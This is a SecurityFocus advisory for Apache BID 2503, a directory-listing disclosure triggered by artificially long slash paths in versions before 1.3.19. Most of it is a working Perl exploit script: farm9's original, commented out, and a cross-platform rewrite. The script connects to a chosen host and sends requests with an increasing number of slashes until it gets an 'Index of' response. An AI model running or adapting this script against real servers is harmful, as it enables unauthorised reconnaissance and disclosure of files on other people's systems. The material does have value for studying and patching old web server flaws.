source: http://www.securityfocus.com/bid/2503/info
   
Apache HTTPD is the Apache Web Server, freely distributed and actively maintained by the Apache Software Foundation. It is a freely available and widely used software package, included with various implementations of the UNIX operating system and can be used on Microsoft Windows operating systems.
   
A problem in the package could allow directory indexing and path discovery. In a default configuration, Apache enables mod_dir, mod_autoindex, and mod_negotiation. However, by sending the Apache server a custom-crafted request consisting of a long path name created artificially by using numerous slashes, an attacker can cause these modules to misbehave, allowing the attacker to escape the error page and to gain a listing of the directory contents.
   
This vulnerability allows a malicious remote user to launch an information-gathering attack, which could potentially result in a compromise of the system. Additionally, this vulnerability affects all releases of Apache previous to 1.3.19.

#!/usr/bin/perl
#
# orginal by farm9, Inc. (copyright 2001)
# new modified code by Siberian (www.sentry-labs.com)
#
########################################################################################
#
# Note: This isn't the orginal exploit! This one was modified and partly rewritten. 
#
# Changes:
#
# - help added (more user firendly :-) )
# - messages added 
# - exploit is now able to be executed on WinNT or 2k.
# - uses perl version of BSD sockets (compatible to Windows)
# 
# Rewriter's Note: I rewrote (I was bored to death that evening :-) ) some
# of the code and made it esaier to use and cross platform compatible.
# The old verion used a esaier but not that compaible way of socket stream communication.  
# Any network code was replaced by cross platform compatible BSD sockets.
# (much better than any other stream method :-) )
# 
# Tested with Perl 5.6 (Linux) and ActivePerl 5.6 (Win32)
#
# Original comment and source is attached below.
#
########################################################################################
#
# Name: Apache Artificially Long Slash Path Directory Listing Exploit
# Author: Matt Watchinski
# Ref: SecurityFocus BID 2503
#
# Affects: Apache 1.3.17 and below
# Tested on: Apache 1.3.12 running on Debian 2.2
#
# Info:  This exploit tricks apache into returning a Index of the a directory
#    even if an index.html file is present.  May not work on some OS's
#
# Details: http_request.c has a subroutine called ap_sub_req_lookup_file that in
#	   very specific cases would feed stat() a filename that was longer than
#	   stat() could handle.  This would result in a condition where stat()
#	   would return 0 and a directory index would be returned instead of the
#	   default index.html.
#
# Code Fragment: /src/main/http_request.c
#    if (strchr(new_file, '/') == NULL) {
#        char *udir = ap_make_dirstr_parent(rnew->pool, r->uri);
#
#        rnew->uri = ap_make_full_path(rnew->pool, udir, new_file);
#        rnew->filename = ap_make_full_path(rnew->pool, fdir, new_file);
#        ap_parse_uri(rnew, rnew->uri);    /* fill in parsed_uri values */
#        if (stat(rnew->filename, &rnew->finfo) < 0) {   <-- Important part
#            rnew->finfo.st_mode = 0;
#        }
#
# Conditions: Mod_dir / Mod_autoindex / Mod_negotiation need to be enabled
#	      The directory must also have the following Options enabled:
#             Indexes and MultiView
#	      Some OS's have different conditions on the number of character
#	      you have to pass to stat to make this work.  If stat doesn't
#	      return 0 for path names less than 8192 or so internal apache
#	      buffer checks will stop this exploit from working.
#
# 	      Debian needed around 4060 /'s to make this work.
#
# Greets: Special thanks to natasha who added a lot of debug to apache for me
#	  while i was trying to figure out what had to be enabled to make this
#	  exploit work.  Also thanks to rfp for pointing out that MultiView
#	  needed to be enabled.
#
# More Greets:  Jeff for not shooting me :) <All your Cisco's belong to us>
#               Anne for being so sexy <I never though corporate espionage
#                   would be so fun>
#               All my homies at farm9
#               DJ Charles / DJ NoloN for the phat beats
#               Marty (go go gadget snort)
#               All my ex-bees
#               RnVjazpIaXZlcndvcmxk
#
# I think that wraps it up.  Have fun.
#
# Usage: ./apacheIndex.pl <host> <port> <HI> <Low>
# Where: Hi and low are the range for the number of / to try
#
#use IO::Socket;
#
#$low  = $ARGV[3]; #Low number of slash characters to try
#$hi   = $ARGV[2]; #High number of slash characters to try
#$port = $ARGV[1]; #Port to try to connect to
#$host = $ARGV[0]; #Host to try to connect to
#
# Main loop.  Not much to this exploit once you figure out what needed to
# be enabled.  Need to do some more testing on sub-dirs to see if it
# works with them.  It should. Also different OS's might use a different number
# of /.  Send me the numbers if you don't mind matt@farm9.com
#
#while($low <= $hi)
#{
#
#$socket = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $port, Proto => "TCP") or die "Connect Failed";
#
#  $url = "";
#  $buffer = "";
#  $end = "";
#
#  $url = "GET ";
#  $buffer = "/" x $low . " HTTP/1.0\r\n";
#  $end = "\r\n\r\n";
#
#  $url = $url . $buffer . $end;
#
#  print $socket "$url";
#  while(<$socket>)
#  {
#    if($_ =~ "Index of")
#    {
#      print "Found the magic number: $low\n";
#      print "Now go do it by hand to to see it all\n";
#      close($socket);
#      exit;
#    }
#  }
#
#  close($socket);
#  $low++;
#}


use Socket;

print "Apache Artificially Long Slash Path Directory Listing Exploit\nSecurityFocus BID 2503\n\n";
print "original exploit code written by Matt Watchinski (www.farm9.com)\n";
print "rewritten and fixed by Siberian (www.sentry-labs.com)\n\n";
$host = shift || 'localhost'; #Host to try to connect to
$port = shift || '80'; #Port to try to connect to
$hi   = shift || '100'; #High number of slash characters to try
$low  = shift || '0'; #Low number of slash characters to try
if(($host eq 'localhost') && ($port eq '80') && ($hi eq '100') && ($low eq '0')) {
print 'Usage: ./apache2.pl <host> <port> <HI> <Low>';
print "\nHi and low are the range for the number of \/ to try\n";
exit 0;
}

print "\ntarget: $host";
print "\nport: $port";
print "\nhi: $hi";
print "\nlow: $low\n\nStarting attack...\n\n";

# Main loop.  Not much to this exploit once you figure out what needed to
# be enabled.  Need to do some more testing on sub-dirs to see if it
# works with them.  It should. Also different OS's might use a different number
# of /.  Send me the numbers if you don't mind matt@farm9.com

$url = "";
$buffer = "";
$end = "";

#$port = (getservbyname($port, 'tcp') || die "No port!");

$iaddr = inet_aton($host);
$paddr = sockaddr_in($port, $iaddr) or die "Faild ...  SOCKADDR_IN!";

$proto = getprotobyname('tcp');

while($low <= $hi) {

socket(SOCKY, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
connect(SOCKY, $paddr ) or die "connect: $!";;

$url = "GET ";
$buffer = "/" x  $low .  " HTTP/1.0\r\n";
$end = "\r\n\r\n";

$url = $url . $buffer . $end;

print ".";

 send(SOCKY,$url,0) or die "send: $!";;
 
 while((recv(SOCKY,$out,1,0)) && ($out ne "")) { 
    if($out eq "I") {
     recv(SOCKY,$out,1,0);
     if($out eq "n") {
      recv(SOCKY,$out,1,0);
      if($out eq "d") {
       recv(SOCKY,$out,1,0);
       if($out eq "e") {
        recv(SOCKY,$out,1,0);
        if($out eq "x") {
         recv(SOCKY,$out,1,0);
          if($out eq " ") {
           recv(SOCKY,$out,1,0);
           if($out eq "o") {
            recv(SOCKY,$out,1,0);
             if($out eq "f") {
           print "Found the magic number: $low\n";
           print "Now go do it by hand to to see it all\n";
           close(SOCKY);
           exit 0;
           }  
          }  
         }  
        }  
       }
      }  
     }  
    }
   }

  close(SOCKY);
  $low++;
}
print "\n\nNot vulnerable :-(\nCheck some other numbers.\n";

